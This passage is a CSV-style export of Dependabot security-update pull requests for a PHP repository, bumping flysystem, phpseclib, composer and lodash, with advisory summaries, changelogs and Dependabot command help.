- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,php,"
jonphipps/Metadata-Registry,930057672,"[Security] Bump league/flysystem from 1.1.3 to 1.1.4","Bumps [league/flysystem](https://github.com/thephpleague/flysystem) from 1.1.3 to 1.1.4. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/FriendsOfPHP/security-advisories/blob/master/league/flysystem/2021-06-24.yaml"">The PHP Security Advisories Database</a>.</em></p>
<blockquote>
<p><strong>TOCTOU Race Condition enabling remote code execution</strong></p>
<p>Affected versions: <!-- raw HTML omitted -->=2.0.0, &lt;2.1.1</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/thephpleague/flysystem/commit/f3ad69181b8afed2c9edf7be5a2918144ff4ea32""><code>f3ad691</code></a> Reject paths with funky whitespace.</li>
<li><a href=""https://github.com/thephpleague/flysystem/commit/1ac14e91c9129463117fe11fb6747fc25a988c1d""><code>1ac14e9</code></a> Added SharePoint community adapter</li>
<li><a href=""https://github.com/thephpleague/flysystem/commit/4347fe7f4dde0954ed3df833fd568806b714e9a0""><code>4347fe7</code></a> Remove ext-fileinfo from suggests, it's already in requires</li>
<li><a href=""https://github.com/thephpleague/flysystem/commit/1bf07fc4389ea8199d0029173e94b68731c5a332""><code>1bf07fc</code></a> Fix time-related tests failing in 2021</li>
<li><a href=""https://github.com/thephpleague/flysystem/commit/13352d2303b67ecfc1306ef1fdb507df1a0fc79f""><code>13352d2</code></a> Remove <a href=""https://github.com/deprecated""><code>@â€‹deprecated</code></a> MountManager</li>
<li><a href=""https://github.com/thephpleague/flysystem/commit/2062a9460fc9bb9d05ce0b215176be378f29e372""><code>2062a94</code></a> Adding AsyncAWS under community support</li>
<li><a href=""https://github.com/thephpleague/flysystem/commit/53f16fd031d76208677cac8751b175d765587d2f""><code>53f16fd</code></a> More precise signatures</li>
<li><a href=""https://github.com/thephpleague/flysystem/commit/2323c98d7d486b8ce13b2b18ed6489aaffad8375""><code>2323c98</code></a> Add missing emptyDir annotation</li>
<li>See full diff in <a href=""https://github.com/thephpleague/flysystem/compare/1.1.3...1.1.4"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=league/flysystem&package-manager=composer&previous-version=1.1.3&new-version=1.1.4)](https://dependabot.com/compatibility-score/?dependency-name=league/flysystem&package-manager=composer&previous-version=1.1.3&new-version=1.1.4)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

**Note:** This repo was added to Dependabot recently, so you'll receive a maximum of 5 PRs for your first few update runs. Once an update run creates fewer than 5 PRs we'll remove that limit.

You can always request more updates by clicking `Bump now` in your [Dependabot dashboard](https://app.dependabot.com).

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,php,"
jonphipps/Metadata-Registry,920272257,"[Security] Bump phpseclib/phpseclib from 3.0.4 to 3.0.9","Bumps [phpseclib/phpseclib](https://github.com/phpseclib/phpseclib) from 3.0.4 to 3.0.9. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/FriendsOfPHP/security-advisories/blob/master/phpseclib/phpseclib/CVE-2021-30130.yaml"">The PHP Security Advisories Database</a>.</em></p>
<blockquote>
<p><strong>Improper Certificate Validation in phpseclib</strong></p>
<p>Affected versions: <!-- raw HTML omitted -->=3.0.0, &lt;3.0.7</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-vf4w-fg7r-5v94"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Improper Certificate Validation in phpseclib</strong>
phpseclib before 2.0.31 and 3.x before 3.0.7 mishandles RSA PKCS#1 v1.5 signature verification.</p>
<p>Affected versions: &gt;= 3.0.0, &lt; 3.0.7</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/phpseclib/phpseclib/releases"">phpseclib/phpseclib's releases</a>.</em></p>
<blockquote>
<h2>3.0.9</h2>
<ul>
<li>SSH2: add getAuthMethodsToContinue() method (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1648"">#1648</a>)</li>
<li>SSH2: timeout would occasionally infinitely loop</li>
<li>SSH2: fix PHP7.4 errors about accessing bool as string (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1656"">#1656</a>)</li>
<li>SSH2: fix issue with key re-exchange (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1644"">#1644</a>)</li>
<li>SFTP: reopen channel on channel closure (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1654"">#1654</a>)</li>
<li>X509: extra characters before cert weren't being removed (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1659"">#1659</a>)</li>
<li>X509: signing with pw protected PSS keys yielded errors (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1657"">#1657</a>)</li>
<li>ASN1: fix timezone issue when non-utc time is given (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1562"">#1562</a>)</li>
<li>ASN1: change how default values are processed for ints and enums (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1665"">#1665</a>)</li>
<li>RSA: OAEP decryption didn't check labels correctly (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1669"">#1669</a>)</li>
</ul>
<h2>3.0.8</h2>
<ul>
<li>AsymetrticKey: add getComment() method (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1638"">#1638</a>)</li>
<li>SymmetricKey: cipher_name_openssl_ecb shouldn't be static because of AES (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1636"">#1636</a>)</li>
<li>X509: don't filter basicConstraints on unique values (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1639"">#1639</a>)</li>
<li>X509: make it so extensions can be set as critical (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1640"">#1640</a>)</li>
</ul>
<h2>3.0.7</h2>
<ul>
<li>X509: always parse the first cert of a bundle (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1568"">#1568</a>)</li>
<li>SSH2: behave like putty with broken publickey auth (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1572"">#1572</a>)</li>
<li>SSH2: don't close channel on unexpected response to channel request (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1631"">#1631</a>)</li>
<li>RSA: cleanup RSA PKCS#1 v1.5 signature verification (CVE-2021-30130)</li>
<li>Crypt: use a custom error handler for mcrypt to avoid deprecation errors</li>
</ul>
<h2>3.0.6</h2>
<ul>
<li>SFTP/Stream: make it so you can write past the end of a file (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1618"">#1618</a>)</li>
<li>SFTP/Stream: fix undefined index notice in stream touch() (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1615"">#1615</a>)</li>
<li>SFTP/Stream: mkdir didn't work (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1617"">#1617</a>)</li>
<li>BigInteger: fix issue with toBits on 32-bit PHP 8 installs</li>
<li>SFTP: digit only filenames were converted to integers by php (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1623"">#1623</a>)</li>
</ul>
<h2>3.0.5</h2>
<ul>
<li>X509: add getCurrentCert method (since $currentCert is now private) (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1602"">#1602</a>)</li>
<li>PublicKeyLoader: add loadPrivateKey() and loadPublicKey() methods (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1603"">#1603</a>)</li>
<li>Rijndael: calling setIV() after setBlockLength() can result in err (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1599"">#1599</a>)</li>
<li>RSA: use OpenSSL for generating private keys (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1596"">#1596</a>)</li>
<li>BigInteger: big speedups for when OpenSSL is used (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1596"">#1596</a>)</li>
</ul>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/phpseclib/phpseclib/blob/master/CHANGELOG.md"">phpseclib/phpseclib's changelog</a>.</em></p>
<blockquote>
<h2>3.0.9 - 2021-06-13</h2>
<ul>
<li>SSH2: add getAuthMethodsToContinue() method (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1648"">#1648</a>)</li>
<li>SSH2: timeout would occasionally infinitely loop</li>
<li>SSH2: fix PHP7.4 errors about accessing bool as string (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1656"">#1656</a>)</li>
<li>SSH2: fix issue with key re-exchange (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1644"">#1644</a>)</li>
<li>SFTP: reopen channel on channel closure (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1654"">#1654</a>)</li>
<li>X509: extra characters before cert weren't being removed (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1659"">#1659</a>)</li>
<li>X509: signing with pw protected PSS keys yielded errors (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1657"">#1657</a>)</li>
<li>ASN1: fix timezone issue when non-utc time is given (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1562"">#1562</a>)</li>
<li>ASN1: change how default values are processed for ints and enums (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1665"">#1665</a>)</li>
<li>RSA: OAEP decryption didn't check labels correctly (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1669"">#1669</a>)</li>
</ul>
<h2>3.0.8 - 2021-04-20</h2>
<ul>
<li>AsymetrticKey: add getComment() method (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1638"">#1638</a>)</li>
<li>SymmetricKey: cipher_name_openssl_ecb shouldn't be static because of AES (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1636"">#1636</a>)</li>
<li>X509: don't filter basicConstraints on unique values (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1639"">#1639</a>)</li>
<li>X509: make it so extensions can be set as critical (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1640"">#1640</a>)</li>
</ul>
<h2>3.0.7 - 2021-04-06</h2>
<ul>
<li>X509: always parse the first cert of a bundle (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1568"">#1568</a>)</li>
<li>SSH2: behave like putty with broken publickey auth (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1572"">#1572</a>)</li>
<li>SSH2: don't close channel on unexpected response to channel request (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1631"">#1631</a>)</li>
<li>RSA: cleanup RSA PKCS#1 v1.5 signature verification (CVE-2021-30130)</li>
<li>Crypt: use a custom error handler for mcrypt to avoid deprecation errors</li>
</ul>
<h2>3.0.6 - 2021-03-13</h2>
<ul>
<li>SFTP/Stream: make it so you can write past the end of a file (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1618"">#1618</a>)</li>
<li>SFTP/Stream: fix undefined index notice in stream touch() (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1615"">#1615</a>)</li>
<li>SFTP/Stream: mkdir didn't work (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1617"">#1617</a>)</li>
<li>BigInteger: fix issue with toBits on 32-bit PHP 8 installs</li>
<li>SFTP: digit only filenames were converted to integers by php (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1623"">#1623</a>)</li>
</ul>
<h2>3.0.5 - 2021-02-12</h2>
<ul>
<li>X509: add getCurrentCert method (since $currentCert is now private) (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1602"">#1602</a>)</li>
<li>PublicKeyLoader: add loadPrivateKey() and loadPublicKey() methods (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1603"">#1603</a>)</li>
<li>Rijndael: calling setIV() after setBlockLength() can result in err (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1599"">#1599</a>)</li>
<li>RSA: use OpenSSL for generating private keys (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1596"">#1596</a>)</li>
<li>BigInteger: big speedups for when OpenSSL is used (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1596"">#1596</a>)</li>
</ul>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/a127a5133804ff2f47ae629dd529b129da616ad7""><code>a127a51</code></a> Merge branch '2.0' into 3.0</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/3ee60b82b98adba65da8e77959e3240fa7016445""><code>3ee60b8</code></a> CHANGELOG: add missing entry</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/fbf5503b21e012a513938d278a2a4a056925d2dd""><code>fbf5503</code></a> Merge branch '2.0' into 3.0</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/cbadee3b2ce6eb373dcfe3cca8632848fd78d539""><code>cbadee3</code></a> CHANGELOG: add 2.0.32 release</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/07423805acdcd575ddefad919749926e79a51780""><code>0742380</code></a> Merge branch '2.0' into 3.0</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/f5c4c19880d45d0be3e7d24ae8ac434844a898cd""><code>f5c4c19</code></a> Tests/RSA: update unit test for 2.0</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/451ddf453cbd107fe4e554eb76462a2921499914""><code>451ddf4</code></a> Merge branch '1.0' into 2.0</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/c3560c2d4d9eba9202714656b2ef303602583467""><code>c3560c2</code></a> RSA: OAEP decryption didn't check labels correctly</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/d1666cac503312e859076a872dd8e716ece273c7""><code>d1666ca</code></a> SFTP: CS adjustments</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/6d4f436da17a2225abed7654d1a4272e022057e8""><code>6d4f436</code></a> X509: add unit tests</li>
<li>Additional commits viewable in <a href=""https://github.com/phpseclib/phpseclib/compare/3.0.4...3.0.9"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=phpseclib/phpseclib&package-manager=composer&previous-version=3.0.4&new-version=3.0.9)](https://dependabot.com/compatibility-score/?dependency-name=phpseclib/phpseclib&package-manager=composer&previous-version=3.0.4&new-version=3.0.9)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

**Note:** This repo was added to Dependabot recently, so you'll receive a maximum of 5 PRs for your first few update runs. Once an update run creates fewer than 5 PRs we'll remove that limit.

You can always request more updates by clicking `Bump now` in your [Dependabot dashboard](https://app.dependabot.com).

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,php,"
jonphipps/Metadata-Registry,869911335,"[Security] Bump composer/composer from 1.10.20 to 1.10.22","Bumps [composer/composer](https://github.com/composer/composer) from 1.10.20 to 1.10.22. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/FriendsOfPHP/security-advisories/blob/master/composer/composer/CVE-2021-29472.yaml"">The PHP Security Advisories Database</a>.</em></p>
<blockquote>
<p><strong>Missing argument delimiter can lead to command execution via VCS repository URLs or source download URLs on systems with Mercurial</strong></p>
<p>Affected versions: &gt;=2.0.0-alpha1, &lt;2.0.13; &lt;1.10.22</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/composer/composer/releases"">composer/composer's releases</a>.</em></p>
<blockquote>
<h2>1.10.22</h2>
<ul>
<li>Security: Fixed command injection vulnerability in HgDriver/HgDownloader and hardened other VCS drivers and downloaders (GHSA-h5h8-pc6h-jvvx / CVE-2021-29472)</li>
</ul>
<h2>1.10.21</h2>
<ul>
<li>Fixed support for new GitHub OAuth token format</li>
<li>Fixed processes silently ignoring the CWD when it does not exist</li>
</ul>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/composer/composer/blob/master/CHANGELOG.md"">composer/composer's changelog</a>.</em></p>
<blockquote>
<h3>[1.10.22] 2021-04-27</h3>
<ul>
<li>Security: Fixed command injection vulnerability in HgDriver/HgDownloader and hardened other VCS drivers and downloaders (GHSA-h5h8-pc6h-jvvx / CVE-2021-29472)</li>
</ul>
<h3>[1.10.21] 2021-04-01</h3>
<ul>
<li>Fixed support for new GitHub OAuth token format</li>
<li>Fixed processes silently ignoring the CWD when it does not exist</li>
</ul>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/composer/composer/commit/28c9dfbe2351635961f670773e8d7b17bc5eda25""><code>28c9dfb</code></a> Release 1.10.22</li>
<li><a href=""https://github.com/composer/composer/commit/cd682f90a6f1834584d9813d57b24435f8640884""><code>cd682f9</code></a> Update xdebug-handler to latest</li>
<li><a href=""https://github.com/composer/composer/commit/1cdbacbe07eac7d360c6bf27931da715b008b84e""><code>1cdbacb</code></a> Update changelog</li>
<li><a href=""https://github.com/composer/composer/commit/083b73515d1d72bc61c6374440b3f8a37531f8cf""><code>083b735</code></a> Merge pull request from GHSA-h5h8-pc6h-jvvx</li>
<li><a href=""https://github.com/composer/composer/commit/4dc293b289fd12a28a3f13780339a0393f094d7c""><code>4dc293b</code></a> Update changelog</li>
<li><a href=""https://github.com/composer/composer/commit/96acad1e45555380a8ca90767b3bc00a2f44bf4f""><code>96acad1</code></a> Update github token pattern to match their latest updates</li>
<li><a href=""https://github.com/composer/composer/commit/54889ca1092e387418f917bcf520ef23d415e8a0""><code>54889ca</code></a> Document GH token usage and also make sure we redact them in Process debug ou...</li>
<li><a href=""https://github.com/composer/composer/commit/dc83ba93f3d8a35629f9a387632e8cd373a144d0""><code>dc83ba9</code></a> Update GitHub token pattern</li>
<li><a href=""https://github.com/composer/composer/commit/06003f4da686acbf2df237cd77985516339242b6""><code>06003f4</code></a> Update release step to use php8 as it produces slightly different output wrt ...</li>
<li><a href=""https://github.com/composer/composer/commit/812207c823ca0c01c7ccf11f6e003d6918daecb8""><code>812207c</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/composer/composer/issues/9695"">#9695</a> from Seldaek/avoid-invalid-dir</li>
<li>Additional commits viewable in <a href=""https://github.com/composer/composer/compare/1.10.20...1.10.22"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=composer/composer&package-manager=composer&previous-version=1.10.20&new-version=1.10.22)](https://dependabot.com/compatibility-score/?dependency-name=composer/composer&package-manager=composer&previous-version=1.10.20&new-version=1.10.22)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,php,"
jonphipps/Metadata-Registry,817317901,"[Security] Bump lodash from 4.17.4 to 4.17.21","Bumps [lodash](https://github.com/lodash/lodash) from 4.17.4 to 4.17.21. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/nodejs/security-wg/blob/master/vuln/npm/368.json"">The Node Security Working Group</a>.</em></p>
<blockquote>
<p><strong>lodash prototype pollution</strong>
lodash node module before 4.17.5 suffers from a prototype pollution vulnerability via 'defaultsDeep', 'merge', and 'mergeWith' functions, which allows a malicious user to modify the prototype of 'Object' via <strong>proto</strong>, causing the addition or modification of an existing property that will exist on all objects.</p>
<p>Affected versions: &lt;4.17.5</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Critical severity vulnerability that affects lodash, lodash-es, lodash-amd, lodash.template, lodash.merge, lodash.mergewith, and lodash.defaultsdeep</strong>
Affected versions of lodash are vulnerable to Prototype Pollution.
The function defaultsDeep could be tricked into adding or modifying properties of Object.prototype using a constructor payload.</p>
<p>Affected versions: &lt; 4.17.12</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-p6mc-m468-83gw"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Prototype Pollution in lodash</strong>
Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The function zipObjectDeep allows a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires zipping objects based on user-provided property arrays.</p>
<p>This vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.</p>
<p>Affected versions: &lt; 4.17.19</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-p6mc-m468-83gw"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Prototype Pollution in lodash</strong>
Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The function zipObjectDeep allows a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires zipping objects based on user-provided property arrays.</p>
<p>This vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.</p>
<p>Affected versions: &lt; 4.17.19</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/nodejs/security-wg/blob/master/vuln/npm/493.json"">The Node Security Working Group</a>.</em></p>
<blockquote>
<p><strong>Denial of Service</strong>
Prototype pollution attack (lodash / constructor.prototype)</p>
<p>Affected versions: &lt;4.17.11</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>High severity vulnerability that affects lodash, lodash-es, lodash-amd, lodash.template, lodash.merge, lodash.mergewith, and lodash.defaultsdeep</strong>
Affected versions of lodash are vulnerable to Prototype Pollution.
The function defaultsDeep could be tricked into adding or modifying properties of Object.prototype using a constructor payload.</p>
<p>Affected versions: &lt; 4.17.13</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects lodash</strong>
lodash prior to 4.7.11 is affected by: CWE-400: Uncontrolled Resource Consumption. The impact is: Denial of service. The component is: Date handler. The attack vector is: Attacker provides very long strings, which the library attempts to match using a regular expression. The fixed version is: 4.7.11.</p>
<p>Affected versions: &lt; 4.17.11</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Low severity vulnerability that affects lodash</strong>
A prototype pollution vulnerability was found in lodash &lt;4.17.11 where the functions merge, mergeWith, and defaultsDeep can be tricked into adding or modifying properties of Object.prototype.</p>
<p>Affected versions: &lt; 4.17.11</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/lodash/lodash/commit/f299b52f39486275a9e6483b60a410e06520c538""><code>f299b52</code></a> Bump to v4.17.21</li>
<li><a href=""https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a""><code>c4847eb</code></a> Improve performance of <code>toNumber</code>, <code>trim</code> and <code>trimEnd</code> on large input strings</li>
<li><a href=""https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c""><code>3469357</code></a> Prevent command injection through <code>_.template</code>'s <code>variable</code> option</li>
<li><a href=""https://github.com/lodash/lodash/commit/ded9bc66583ed0b4e3b7dc906206d40757b4a90a""><code>ded9bc6</code></a> Bump to v4.17.20.</li>
<li><a href=""https://github.com/lodash/lodash/commit/63150ef7645ac07961b63a86490f419f356429aa""><code>63150ef</code></a> Documentation fixes.</li>
<li><a href=""https://github.com/lodash/lodash/commit/00f0f62a979d2f5fa0287c06eae70cf9a62d8794""><code>00f0f62</code></a> test.js: Remove trailing comma.</li>
<li><a href=""https://github.com/lodash/lodash/commit/846e434c7a5b5692c55ebf5715ed677b70a32389""><code>846e434</code></a> Temporarily use a custom fork of <code>lodash-cli</code>.</li>
<li><a href=""https://github.com/lodash/lodash/commit/5d046f39cbd27f573914768e3b36eeefcc4f1229""><code>5d046f3</code></a> Re-enable Travis tests on <code>4.17</code> branch.</li>
